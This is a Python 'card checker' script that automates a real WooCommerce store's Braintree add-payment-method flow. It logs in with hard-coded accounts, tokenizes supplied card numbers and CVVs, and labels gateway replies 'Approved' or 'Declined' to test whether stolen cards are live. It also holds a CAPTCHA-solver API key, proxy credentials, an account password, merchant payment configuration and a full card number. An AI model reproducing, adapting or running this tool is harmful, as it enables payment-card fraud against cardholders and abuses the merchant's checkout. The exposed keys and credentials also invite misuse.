import random
import secrets

from requests import Session
import string
import uuid
import names
import base64
import random
import capsolver
import secrets
import base64
from requests import Session
from dataclasses import dataclass
import uuid,base64, json
from retry import retry
import random



class Solverv2:

    def solver(self,url,keysite):
        self.session = Session()
        capsolver.api_key = 'CAP-49921C094F791244557416016E4CD408'
        solution = capsolver.solve({"type": "ReCaptchaV2Task","websiteURL": url,"websiteKey": keysite})
        return solution

@dataclass
class BehaviorsBraintree:

    def ResponseHtml(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:              return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response

    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards
    
    def generate_random_email_and_uuid():
        random_email = ''.join(random.choices(string.ascii_lowercase, k=8)) + '@gmail.com'
        random_uuid = str(uuid.uuid4())
        return random_email, random_uuid
    


    @classmethod
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):

        self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        try:
            return self.uophs
        
        except: 
            return 'value not found' 
    
    @classmethod    
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'


    @classmethod
    def correlation_id(self):
        self.id_corre = secrets.token_hex(16)
        return self.id_corre
    
    
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end

    
    @classmethod
    def Response(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', 'Charged $1.0'
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number' in response:                return 'Approved! ✅', response
        else:                                                       return 'Declined! ❌', response
            
    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end




correlationid = secrets.token_hex(16)
class almine:
    def main(self,card):
     #   try: 
            self.Nombre = BehaviorsBraintree().RandomName('username')
            self.UseMail = BehaviorsBraintree().RandomName('correo')

            self.session = Session()
          #  self.session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})
            
            user = ['yuhiro891@gmail.com','y.uhiro891@gmail.com','yu.hiro891@gmail.com','yuh.iro891@gmail.com','yuhi.ro891@gmail.com','yuhir.o891@gmail.com','yuhiro.891@gmail.com','yuhiro8.91@gmail.com','yuhiro89.1@gmail.com','yuhiro8.9.1@gmail.com',]
            usernames = random.choice(user)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://almine.store/my-account/add-payment-method/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_1 = self.session.get('https://almine.store/my-account/', headers=headers)
            self.nonce_login = BehaviorsBraintree().QueryText(self.req_1.text,'name="woocommerce-login-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://almine.store','priority': 'u=0, i','referer': 'https://almine.store/my-account/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'username': usernames,'password': 'Cuenta1234','woocommerce-login-nonce': self.nonce_login,'_wp_http_referer': '/my-account/','login': 'Log in',}
            self.session.post('https://almine.store/my-account/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://almine.store/my-account/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.session.get('https://almine.store/my-account/', headers=headers)
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://almine.store/my-account/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.session.get('https://almine.store/my-account/payment-methods/', headers=headers)
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://almine.store/my-account/payment-methods/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_2 = self.session.get('https://almine.store/my-account/add-payment-method/', headers=headers)
            
            wc_braintree_client_token = BehaviorsBraintree().QueryText(self.req_2.text,'var wc_braintree_client_token = ["','"')
            payment_nonce = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.token_bear = BehaviorsBraintree().DecodeBear(wc_braintree_client_token)

            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','authorization': f'Bearer {self.token_bear}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],'billingAddress': {},},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            self.req_3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = BehaviorsBraintree().QueryText(self.req_3.text,'{"token":"','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://almine.store','priority': 'u=0, i','referer': 'https://almine.store/my-account/add-payment-method/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'payment_method': 'braintree_cc','braintree_cc_nonce_key': self.token_card,'braintree_cc_device_data': '{"device_session_id":"50ef5c64e654151d7d6df03c6cd104b8","fraud_merchant_id":null,"correlation_id":"' +correlationid+ '"}','braintree_cc_3ds_nonce_key': '','braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zw2jtjvsjxvbbskx/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zw2jtjvsjxvbbskx"},"merchantId":"zw2jtjvsjxvbbskx","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"zw2jtjvsjxvbbskx","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"4199865933644128753","accessToken":"access_token$production$zw2jtjvsjxvbbskx$7bb64c0a150cbdc241894e699a6bcfb8","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Original Ones","clientId":"ATZnxR59cSF-XcGRAS7jvDne7YOXi-8LoqHGFUWricoK-8rZHRNUiJ0Zu-1j8oOlIh9-alshFZDaAmxv","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"OriginalOnes_instant","payeeEmail":null,"currencyIsoCode":"USD"}}','woocommerce-add-payment-method-nonce': payment_nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',            }
            Auth = self.session.post('https://almine.store/my-account/add-payment-method/', headers=headers, data=data)
            self.session.close()
            error = BehaviorsBraintree().QueryText(Auth.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
            else: return BehaviorsBraintree().Response(error[1].split('t method. Reason: ')[1].strip())

        #except: return 'Declined! ❌','Declined - Call Issue'


print(almine().main('4782002076830811|12|2029|392'))